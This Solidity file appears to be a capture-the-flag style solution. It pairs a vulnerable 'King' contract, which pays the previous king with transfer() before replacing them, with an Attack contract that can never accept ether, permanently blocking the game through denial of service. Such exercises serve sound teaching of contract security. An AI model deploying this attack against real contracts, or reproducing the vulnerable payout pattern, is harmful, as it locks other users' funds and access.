// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// DoS

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Attack {
    function becomeKing(address _king) public payable {
        (bool success, ) = _king.call{value: msg.value}("");
        require(success);
    }

    function checkBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
